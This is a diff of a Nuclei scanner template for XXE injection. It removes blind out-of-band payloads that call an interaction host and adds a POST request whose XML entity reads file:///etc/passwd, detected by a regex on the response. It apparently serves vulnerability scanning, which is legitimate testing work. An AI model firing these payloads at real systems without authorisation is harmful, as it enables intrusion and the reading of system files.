@@ -1,47 +1,33 @@
-id: XXE_injection
+id: Bruteforce-xxe
 
 info:
-  name: XXE-injection
-  author: MR.iambatman
+  name: Generic Bruteforce XXE
+  author: vijay
   severity: high
-  description: XXE
+  tags: xxe,generic,blind
+  metadata:
+    max-request: 1
 
-requests:
+http:
   - raw:
       - |
-        GET / HTTP/1.1
+        POST  HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] > 
-        Connection: close
-        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+        Accept: text/html,application/xhtml+xml,application/xml,text/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Content-Type: application/xml
+        Referer: {{BaseURL}}
+        Pragma: no-cache
 
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
-        Connection: close
-        Content-Type: application/x-www-form-urlencoded
-        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY>
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <foo>&xxe;</foo>
 
-      - |
-        PUT / HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
-        Connection: close
-        Content-Type: application/x-www-form-urlencoded
-        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
-    
-    payloads:
-      header: helpers/payloads/request-headers.txt   
-    
-    attack: clusterbomb
-    redirects: true
-   
+    matchers-condition: and
     matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
